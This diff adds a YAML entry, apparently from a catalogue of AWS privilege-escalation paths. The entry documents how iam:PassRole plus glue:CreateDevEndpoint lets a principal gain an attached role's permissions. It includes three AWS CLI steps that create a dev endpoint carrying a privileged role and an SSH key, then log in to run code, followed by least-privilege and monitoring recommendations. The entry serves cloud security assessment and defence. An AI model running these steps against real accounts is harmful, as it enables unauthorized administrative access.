@@ -1,0 +1,77 @@
+id: glue-001
+name: iam:PassRole + glue:CreateDevEndpoint
+category: service-passrole
+services:
+- iam
+- glue
+description: A principal with `iam:PassRole` and `glue:CreateDevEndpoint` can create a new Glue development endpoint and attach
+  an existing IAM role to it. Glue dev endpoints provide SSH/Zeppelin notebook access where arbitrary code can be executed
+  with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
+prerequisites:
+  admin:
+  - A role must exist that trusts glue.amazonaws.com to assume it
+  - The role must have administrative permissions (e.g., AdministratorAccess)
+  lateral:
+  - A role must exist that trusts glue.amazonaws.com to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: |
+      aws glue create-dev-endpoint --endpoint-name privesc-endpoint \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \
+        --public-key "$(cat ~/.ssh/id_rsa.pub)"
+    description: Create a Glue development endpoint with the privileged role and your SSH public key
+  - step: 2
+    command: aws glue get-dev-endpoint --endpoint-name privesc-endpoint
+    description: Wait for the endpoint to become available and retrieve connection details
+  - step: 3
+    command: ssh glue@ENDPOINT_ADDRESS
+    description: SSH into the dev endpoint and execute code with elevated privileges
+recommendation: |
+  Restrict the `iam:PassRole` permission using the principle of least privilege.
+
+  Use IAM policy conditions to restrict which roles can be passed:
+
+  ```json
+  {
+    "Effect": "Allow",
+    "Action": "iam:PassRole",
+    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificGlueRole",
+    "Condition": {
+      "StringEquals": {
+        "iam:PassedToService": "glue.amazonaws.com"
+      }
+    }
+  }
+  ```
+
+  Additional controls:
+  - Restrict `glue:CreateDevEndpoint` to authorized users only
+  - Require dev endpoints to be created in private subnets with VPC endpoints
+  - Monitor CloudTrail for Glue dev endpoint creation
+  - Implement automated scanning for exposed dev endpoints
+discoveredBy:
+  name: Bishop Fox
+  organization: Bishop Fox
+references:
+- title: 'Well, That Escalated Quickly: How Abusing AWS API Can Lead to Admin Access'
+  url: https://know.bishopfox.com/research/privilege-escalation-in-aws
+- title: IAM Vulnerable - Glue CreateDevEndpoint
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- glue-002
+- ec2-001
+- lambda-001
+toolSupport:
+  iamVulnerable: true
+permissions:
+  required:
+  - permission: iam:PassRole
+    resourceConstraints: Target role ARN must be in the Resource section
+  - permission: glue:CreateDevEndpoint
+    resourceConstraints: Must have permission to create Glue development endpoints
+  additional:
+  - permission: iam:ListRoles
+    resourceConstraints: Helpful for discovering available roles to pass
+  - permission: iam:GetRole
+    resourceConstraints: Useful for viewing role trust policies and attached permissions
